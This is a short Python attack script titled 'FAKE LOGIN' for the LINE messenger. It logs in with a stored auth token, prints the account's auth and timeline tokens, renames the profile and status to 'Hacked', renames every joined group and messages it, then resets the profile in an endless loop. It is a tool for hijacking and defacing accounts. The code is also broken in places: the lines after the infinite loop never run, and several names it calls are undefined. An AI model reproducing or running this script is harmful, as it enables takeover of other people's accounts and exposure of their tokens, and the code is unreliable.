# FAKE LOGIN
from linepy  import *
from akad.ttypes import Message
from akad.ttypes import ContentType as Type
from akad.ttypes import TalkException
#=====================================================================
try:
    with open('khie/token1.txt','r') as tokens:
        token = tokens.read()
    print(str(token))
except Exception as e:
    noobcoder = LINE()
noobcoder = LINE(token)
noobcoder.log("Auth Token : " + str(noobcoder.authToken)) 
noobcoder.log("Timeline Token : " + str(noobcoder.tl.channelAccessToken))

p = noobcoder.getProfile()
p.displayName = "Hacked"
p.statusMessage = "Hacked"
noobcoder.updateProfile(p)
groups = noobcoder.getGroupIdsJoined()
for g in groups:
    G = noobcoder.getGroup(g)
    G.name = "< Rbs Store >"
    noobcoder.sendMessage(g,"Hello !")
    noobcoder.updateGroup(G)
while True:
    noobcoder.updateProfile(p)

noobcoderProfile = noobcoder.getProfile()
noobcoderSettings = noobcoder.getSettings()
noobcoderPoll = OEPoll(noobcoder)
noobcoderStart = time.time()
noobcoderMID = noobcoder.getProfile().mid
   
def run():
    while True:
        try:
            ops = noobcoderPoll.singleTrace(count=50)
            if ops != None:
                for op in ops:
                   noobcoderBot(op)
                   noobcoderPoll.setRevision(op.revision)
        except Exception as e:
            logError(e)
            
if __name__ == "__main__":
    run()